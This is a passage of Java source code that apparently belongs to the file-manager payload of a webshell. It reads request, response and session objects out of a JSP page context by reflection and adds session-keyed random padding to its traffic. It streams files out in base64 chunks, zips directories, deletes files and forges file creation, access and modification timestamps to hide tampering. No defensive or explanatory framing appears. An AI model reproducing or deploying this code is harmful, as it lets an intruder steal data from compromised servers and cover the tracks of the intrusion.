                result.put("msg", "文件" + path + "存在，但是删除失败.");
            }
        } else {
            result.put("status", "fail");
            result.put("msg", "文件不存在.");
        }
        return result;
    }

    private String getTimeStamp() throws Exception {
        DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        File f = new File(path);
        Map<String, String> timeStampObj = new HashMap<>();
        if (f.exists()) {
            getClass();
            Class<?> cls = Class.forName("java.nio.file.Files");
            getClass();
            Class<?> cls2 = Class.forName("java.nio.file.attribute.BasicFileAttributes");
            getClass();
            Class<?> cls3 = Class.forName("java.nio.file.Paths");
            Object file = cls3.getMethod("get", String.class, String[].class).invoke(cls3.getClass(), path, new String[0]);
            Object attrs = cls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(cls, file, cls2, new LinkOption[0]);
            Class<?> cls4 = Class.forName("java.nio.file.attribute.FileTime");
            Object createTime = cls4.getMethod("toMillis", new Class[0]).invoke(cls2.getMethod("creationTime", new Class[0]).invoke(attrs, new Object[0]), new Object[0]);
            Object lastAccessTime = cls4.getMethod("toMillis", new Class[0]).invoke(cls2.getMethod("lastAccessTime", new Class[0]).invoke(attrs, new Object[0]), new Object[0]);
            Object lastModifiedTime = cls4.getMethod("toMillis", new Class[0]).invoke(cls2.getMethod("lastModifiedTime", new Class[0]).invoke(attrs, new Object[0]), new Object[0]);
            String createTimeStamp2 = df.format(new Date(((Long) createTime).longValue()));
            String lastAccessTimeStamp = df.format(new Date(((Long) lastAccessTime).longValue()));
            String lastModifiedTimeStamp = df.format(new Date(((Long) lastModifiedTime).longValue()));
            timeStampObj.put("createTime", createTimeStamp2);
            timeStampObj.put("lastAccessTime", lastAccessTimeStamp);
            timeStampObj.put("lastModifiedTime", lastModifiedTimeStamp);
            String result = buildJson(timeStampObj, true);
            return result;
        }
        throw new Exception("文件不存在");
    }

    private boolean isWindows() {
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
            return true;
        }
        return false;
    }

    private String updateTimeStamp() throws Exception {
        DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        File f = new File(path);
        if (f.exists()) {
            f.setLastModified(df.parse(modifyTimeStamp).getTime());
            if (!isOldJava()) {
                Class<?> cls = Class.forName("java.nio.file.Paths");
                Class<?> cls2 = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
                Class<?> cls3 = Class.forName("java.nio.file.attribute.FileTime");
                Method getFileAttributeView = Class.forName("java.nio.file.Files").getMethod("getFileAttributeView", Path.class, Class.class, LinkOption[].class);
                Object attributes = getFileAttributeView.invoke(Class.forName("java.nio.file.Files"), cls.getMethod("get", String.class, String[].class).invoke(cls.getClass(), path, new String[0]), cls2, new LinkOption[0]);
                Object createTime = cls3.getMethod("fromMillis", Long.TYPE).invoke(cls3, Long.valueOf(df.parse(createTimeStamp).getTime()));
                Object accessTime = cls3.getMethod("fromMillis", Long.TYPE).invoke(cls3, Long.valueOf(df.parse(accessTimeStamp).getTime()));
                Object modifyTime = cls3.getMethod("fromMillis", Long.TYPE).invoke(cls3, Long.valueOf(df.parse(modifyTimeStamp).getTime()));
                cls2.getMethod("setTimes", cls3, cls3, cls3).invoke(attributes, modifyTime, accessTime, createTime);
            }
            return "时间戳修改成功。";
        }
        throw new Exception("文件不存在");
    }

    private String downloadPart(String path2, long blockIndex2, long blockSize2) throws Exception {
        int size;
        FileChannel ch = (FileChannel) sessionGetAttribute(this.Session, path2);
        if (ch == null) {
            FileInputStream fis = new FileInputStream(path2);
            ch = fis.getChannel();
            sessionSetAttribute(this.Session, "fis", fis);
            sessionSetAttribute(this.Session, path2, ch);
        }
        ByteBuffer buffer = ByteBuffer.allocate((int) blockSize2);
        synchronized (ch) {
            ch.position(blockIndex2 * blockSize2);
            size = ch.read(buffer);
        }
        byte[] content2 = new byte[size];
        System.arraycopy(buffer.array(), 0, content2, 0, size);
        return base64encode(content2);
    }

    private static void zipFile(String srcDir, boolean KeepDirStructure) throws Exception {
        File file = new File(srcDir);
        String fileName = file.getName();
        FileOutputStream out = new FileOutputStream(new File(srcDir).getParentFile().getAbsolutePath() + File.separator + fileName + ".zip");
        System.currentTimeMillis();
        ZipOutputStream zos = null;
        try {
            try {
                zos = new ZipOutputStream(out);
                File sourceFile = new File(srcDir);
                compress(sourceFile, zos, sourceFile.getName(), KeepDirStructure);
                System.currentTimeMillis();
                if (zos != null) {
                    try {
                        zos.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            } catch (Exception e2) {
                throw new RuntimeException("zip error from ZipUtils", e2);
            }
        } catch (Throwable th) {
            if (zos != null) {
                try {
                    zos.close();
                } catch (IOException e3) {
                    e3.printStackTrace();
                }
            }
            throw th;
        }
    }

    private static void compress(File sourceFile, ZipOutputStream zos, String name, boolean KeepDirStructure) throws Exception {
        byte[] buf = new byte[102400];
        if (sourceFile.isFile()) {
            zos.putNextEntry(new ZipEntry(name));
            FileInputStream in = new FileInputStream(sourceFile);
            while (true) {
                int len = in.read(buf);
                if (len != -1) {
                    zos.write(buf, 0, len);
                } else {
                    zos.closeEntry();
                    in.close();
                    return;
                }
            }
        } else {
            File[] listFiles = sourceFile.listFiles();
            if (listFiles == null || listFiles.length == 0) {
                if (KeepDirStructure) {
                    zos.putNextEntry(new ZipEntry(name + "/"));
                    zos.closeEntry();
                    return;
                }
                return;
            }
            for (File file : listFiles) {
                if (KeepDirStructure) {
                    compress(file, zos, name + "/" + file.getName(), KeepDirStructure);
                } else {
                    compress(file, zos, file.getName(), KeepDirStructure);
                }
            }
        }
    }

    private String buildJsonArray(List<Map<String, String>> list, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("[");
        for (Map<String, String> entity : list) {
            sb.append(buildJson(entity, encode) + ",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("]");
        return sb.toString();
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class<?> cls = Class.forName("java.util.Base64");
                    Object Encoder = cls.getMethod("getEncoder", null).invoke(cls, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes("UTF-8"))).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private byte[] base64decode(String base64Text) throws Exception {
        byte[] result;
        String version = System.getProperty("java.version");
        if (version.compareTo("1.9") >= 0) {
            getClass();
            Class<?> cls = Class.forName("java.util.Base64");
            Object Decoder = cls.getMethod("getDecoder", null).invoke(cls, null);
            result = (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
        } else {
            getClass();
            Object Decoder2 = Class.forName("sun.misc.BASE64Decoder").newInstance();
            result = (byte[]) Decoder2.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder2, base64Text);
        }
        return result;
    }

    private static String base64encode(String content2) throws Exception {
        String result;
        String version = System.getProperty("java.version");
        if (version.compareTo("1.9") >= 0) {
            Class<?> cls = Class.forName("java.util.Base64");
            Object Encoder = cls.getMethod("getEncoder", null).invoke(cls, null);
            result = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content2.getBytes("UTF-8"));
        } else {
            Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
            String result2 = (String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, content2.getBytes("UTF-8"));
            result = result2.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private static String base64encode(byte[] content2) throws Exception {
        String result;
        String version = System.getProperty("java.version");
        if (version.compareTo("1.9") >= 0) {
            Class<?> cls = Class.forName("java.util.Base64");
            Object Encoder = cls.getMethod("getEncoder", null).invoke(cls, null);
            result = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content2);
        } else {
            Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
            String result2 = (String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, content2);
            result = result2.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private byte[] getMagic() throws Exception {
        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
        Random random = new Random();
        byte[] buf = new byte[magicNum];
        for (int i = 0; i < buf.length; i++) {
            buf[i] = (byte) random.nextInt(256);
        }
        return buf;
    }

    private Object sessionGetAttribute(Object session, String key) {
        Object result = null;
        try {
            result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
        } catch (Exception e) {
        }
        return result;
    }

    private void sessionSetAttribute(Object session, String key, Object value) {
        try {
            session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
        } catch (Exception e) {
        }
    }
}
